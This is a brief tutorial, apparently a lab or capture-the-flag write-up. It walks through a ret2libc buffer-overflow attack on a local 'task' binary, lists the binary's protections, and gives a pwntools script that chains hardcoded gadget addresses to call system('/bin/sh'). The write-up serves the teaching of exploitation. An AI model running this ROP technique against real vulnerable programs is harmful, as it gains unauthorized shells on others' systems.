# ret2lib C Attack

In this example, we will demonstrate a ret2lib (return-to-library) attack on the `task` binary using a Python exploit. The binary asks the user for their favorite color and then compares it using `strcmp`, creating a vulnerability that allows for a buffer overflow attack.

## File Protections

Before proceeding with the attack, we used `gdb` with `pwndbg` to analyze the file protections of the `task` binary. Here are the relevant protections:

- RELRO: Partial RELRO
- Stack: No canary found
- NX: NX enabled
- PIE: No PIE (0x400000)
- ASLR: Disabled

## Exploiting the Vulnerability

To exploit the buffer overflow vulnerability in the `task` binary, we will use the following Python exploit code:

```python
from pwn import *

elf = context.binary = ELF('./task')

pop_rdi = 0x00000000004012c3
bin_sh = 0x7ffff7f5c031
sys = 0x7ffff7e12330
ret = 0x000000000040101a

payload = cyclic(24) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(sys)

io = process('./task')
io.sendline(payload)
io.interactive()
